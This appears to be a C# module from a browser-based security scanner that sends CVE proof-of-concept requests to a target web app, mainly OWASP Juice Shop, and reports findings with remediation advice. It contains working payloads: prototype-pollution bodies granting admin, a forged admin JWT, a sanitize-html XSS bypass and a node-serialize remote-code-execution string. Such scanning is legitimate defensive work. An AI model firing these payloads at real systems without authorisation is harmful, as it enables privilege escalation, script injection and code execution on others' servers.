using System.Text.Json;
using System.Text.RegularExpressions;
using Trowser.Automation;

namespace Trowser.Security.SupplyChain;

/// <summary>
/// Hand-rolled CVE exploit primitives for known vulnerable npm deps (Juice Shop set).
/// Inspired by common CVE PoC patterns for reachability checks; also influenced by
/// pentest-ai <c>cve_poc_primitives.py</c>. Detection is package/version-gated and advisory-specific.
/// </summary>
public static class CveReachabilityRunner
{
    private sealed record CvePrimitive(
        string Cve,
        string Package,
        string VersionMax,
        string Method,
        string Path,
        string? BodyJson,
        Dictionary<string, string>? Headers,
        string? FollowUpMethod,
        string? FollowUpPath,
        Func<string, bool> Detect,
        string Severity,
        string Title,
        string Remediation);

    private static readonly CvePrimitive[] Primitives =
    [
        new(
            "CVE-2017-16028", "marsdb", "0.6.11", "POST", "/api/Users/",
            """{"email":"ptai-mars@example.com","password":"x","constructor":{"prototype":{"isAdmin":true,"polluted":"ptai-cve"}}}""",
            null, "GET", "/api/me",
            body => body.Contains("\"isAdmin\":true", StringComparison.OrdinalIgnoreCase)
                    || body.Contains("\"polluted\":\"ptai-cve\"", StringComparison.OrdinalIgnoreCase),
            "critical", "marsdb prototype pollution (CVE-2017-16028) confirmed",
            "Upgrade marsdb or stop using prototype-pollutable merge paths."),
        new(
            "CVE-2021-44906", "minimist", "1.2.5", "POST", "/api/Users/",
            """{"email":"ptai-min@example.com","password":"x","constructor":{"prototype":{"isAdmin":true}}}""",
            null, "GET", "/api/me",
            body => body.Contains("\"isAdmin\":true", StringComparison.OrdinalIgnoreCase),
            "critical", "minimist prototype pollution (CVE-2021-44906) confirmed",
            "Upgrade minimist to 1.2.6 or later."),
        new(
            "CVE-2015-9235", "jsonwebtoken", "8.5.0", "GET", "/rest/user/whoami", null,
            new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                ["Authorization"] = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifX0.ptai-forged-hs256-confusion-sig"
            },
            null, null,
            body => body.Contains("\"email\"", StringComparison.Ordinal) && body.Contains("\"id\"", StringComparison.Ordinal),
            "critical", "jsonwebtoken HS256/RS256 alg confusion (CVE-2015-9235) confirmed",
            "Upgrade jsonwebtoken and pass explicit algorithms allowlist to verify()."),
        new(
            "CVE-2021-26539", "sanitize-html", "2.3.1", "POST", "/api/Feedbacks/",
            """{"comment":"<noscript><p title=\"</noscript><img src=x onerror=window.__ptai_xss=1>\">","rating":1,"captchaId":0,"captcha":"x"}""",
            null, "GET", "/api/Feedbacks/",
            body => body.Contains("onerror=window.__ptai_xss=1", StringComparison.OrdinalIgnoreCase)
                    || (body.Contains("ptai-xss-cve", StringComparison.OrdinalIgnoreCase) && body.Contains("<script", StringComparison.OrdinalIgnoreCase)),
            "high", "sanitize-html bypass (CVE-2021-26539) confirmed",
            "Upgrade sanitize-html to 2.3.2 or later."),
        new(
            "CVE-2017-1000048", "node-serialize", "0.0.4", "POST", "/api/Users/",
            """{"email":"ptai-ser@example.com","password":"x","rce":"_$$ND_FUNC$$_function(){return 'ptai-rce-cve'}()"}""",
            null, "GET", "/api/me",
            body => body.Contains("ptai-rce-cve", StringComparison.Ordinal),
            "critical", "node-serialize unserialize RCE (CVE-2017-1000048) confirmed",
            "Stop using node-serialize; use JSON.parse with explicit schemas."),
    ];

    private static readonly HashSet<string> JuiceShopPackages = ["marsdb", "node-serialize"];
    private static readonly HashSet<string> GenericFallbackPackages = ["jsonwebtoken", "http-cache-semantics", "tough-cookie"];

    public static async Task<List<SupplyChainFinding>> RunAsync(
        AutomationContext ctx,
        IReadOnlyDictionary<string, string> manifestVersions,
        bool blindRun,
        int timeoutMs,
        bool includeBrowserCookies = true,
        CancellationToken ct = default)
    {
        var pageUrl = await ctx.GetCurrentUrl();
        if (!Uri.TryCreate(pageUrl, UriKind.Absolute, out var pageUri))
            return [];

        var origin = pageUri.GetLeftPart(UriPartial.Authority);
        var applicable = await SelectApplicableAsync(manifestVersions, blindRun, origin, ctx, timeoutMs, ct);
        var findings = new List<SupplyChainFinding>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var p in applicable)
        {
            if (!seen.Add(p.Cve)) continue;
            ct.ThrowIfCancellationRequested();

            var url = origin + p.Path;
            var fetch = await SecurityProbeHttp.FetchAsync(
                ctx, url, p.Method,
                p.Headers,
                p.BodyJson,
                timeoutMs,
                includeBrowserCookies,
                ct);

            var body = fetch.Body ?? "";
            if (p.FollowUpPath != null)
            {
                var followUrl = origin + p.FollowUpPath;
                var follow = await SecurityProbeHttp.FetchAsync(
                    ctx, followUrl, p.FollowUpMethod ?? "GET", null, null, timeoutMs, includeBrowserCookies, ct);
                body += "\n" + (follow.Body ?? "");
            }

            if (!p.Detect(body)) continue;

            findings.Add(new SupplyChainFinding
            {
                Category = "vulnerable-component",
                Severity = p.Severity,
                Title = p.Title,
                Endpoint = url,
                Method = p.Method,
                Detail = p.Remediation,
                Evidence = $"CVE={p.Cve} package={p.Package} status={fetch.Status}",
                Tags = ["cve-reachability", p.Cve, p.Package]
            });
        }

        return findings;
    }

    private static async Task<List<CvePrimitive>> SelectApplicableAsync(
        IReadOnlyDictionary<string, string> manifestVersions,
        bool blindRun,
        string origin,
        AutomationContext ctx,
        int timeoutMs,
        CancellationToken ct)
    {
        if (manifestVersions.Count > 0)
        {
            return Primitives.Where(p => manifestVersions.TryGetValue(p.Package, out var ver)
                                         && VersionLe(ver, p.VersionMax)).ToList();
        }

        if (!blindRun) return [];

        var isJuiceShop = await IsJuiceShopTargetAsync(origin, ctx, timeoutMs, ct);
        return isJuiceShop
            ? Primitives.ToList()
            : Primitives.Where(p => GenericFallbackPackages.Contains(p.Package)).ToList();
    }

    private static async Task<bool> IsJuiceShopTargetAsync(
        string origin, AutomationContext ctx, int timeoutMs, CancellationToken ct)
    {
        foreach (var path in new[] { "/rest/admin/application-configuration", "/api/Challenges" })
        {
            var fetch = await SecurityProbeHttp.FetchAsync(ctx, origin + path, "GET", null, null, timeoutMs, true, ct);
            if (fetch.Status != 200 || string.IsNullOrEmpty(fetch.Body)) continue;
            var lower = fetch.Body.ToLowerInvariant();
            if (lower.Contains("juice shop") || lower.Contains("juice-sh.op"))
                return true;
        }
        return false;
    }

    internal static bool VersionLe(string a, string b)
    {
        var pa = ParseVersion(a);
        var pb = ParseVersion(b);
        if (pa == null || pb == null) return false;
        for (var i = 0; i < 3; i++)
        {
            if (pa[i] < pb[i]) return true;
            if (pa[i] > pb[i]) return false;
        }
        return true;
    }

    private static int[]? ParseVersion(string raw)
    {
        var m = Regex.Match(raw ?? "", @"(\d+)\.(\d+)\.(\d+)");
        if (!m.Success) return null;
        return [int.Parse(m.Groups[1].Value), int.Parse(m.Groups[2].Value), int.Parse(m.Groups[3].Value)];
    }
}
